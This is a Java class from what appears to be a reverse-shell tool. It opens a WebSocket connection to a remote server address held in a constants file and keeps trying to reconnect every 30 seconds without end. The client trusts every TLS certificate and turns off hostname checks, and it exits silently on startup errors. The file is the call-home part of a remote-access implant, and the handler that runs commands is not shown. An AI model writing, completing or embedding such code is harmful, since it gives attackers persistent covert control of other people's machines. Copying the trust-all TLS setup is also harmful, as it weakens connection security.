package com.mtattab.reverseshell.service.impl;

import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.util.Constants;
import lombok.Data;
import lombok.extern.java.Log;
import org.eclipse.jetty.util.ssl.SslContextFactory;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
import org.eclipse.jetty.websocket.client.WebSocketClient;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;

@Data
@Log
public class ReverseShell implements WebsocketReverseShellService {

    WebSocketClient client;



    String serverUriLink = Constants.SERVER_WEBSOCKET_URI;

    public WebSocketClient createClient(){

        // Create a custom TrustManager that trusts all certificates
        SslContextFactory.Client ssl = new SslContextFactory.Client(); // ssl config
        ssl.setEndpointIdentificationAlgorithm(null); // disable endpoint identification algorithm.
        ssl.setTrustAll(true);

        this.client = new WebSocketClient(ssl); // give ssl config to client
        this.client.setMaxIdleTimeout(0);
        return this.client;
    }


    public void startReverseShell(){
        if (!checkClient())return; // check if client is instantiated

        try {
            this.client.start();


// connect
            connectWithReconnectionSupport();




        } catch (Exception e) {
            e.printStackTrace();

            System.exit(0);
        }


    }


    private void connectWithReconnectionSupport() throws ExecutionException, InterruptedException, IOException, URISyntaxException {
        URI serverUri = new URI(this.serverUriLink); // Replace with your server URL

        while (true){

            WebSocketImpl socket = new WebSocketImpl();
            try {
                Future<Session> session = this.client.connect(socket, serverUri, new ClientUpgradeRequest());

                while (session.get().isOpen()){
//               don't create new sessions while the session is open
                }
            }catch (Exception e){
               e.printStackTrace();

            }

//            if connection is lost reconnect after 30 seconds
            Thread.sleep(30000);

        }
    }


    private boolean checkClient(){
        // check if client is instantiated
        if (this.client != null){
            log.info("Client is active");
            return true;
        }else {
            log.severe("Client is not active");
            log.info("please activate the client");
            throw new RuntimeException("Client is not instantiated.");
        }
    }



}
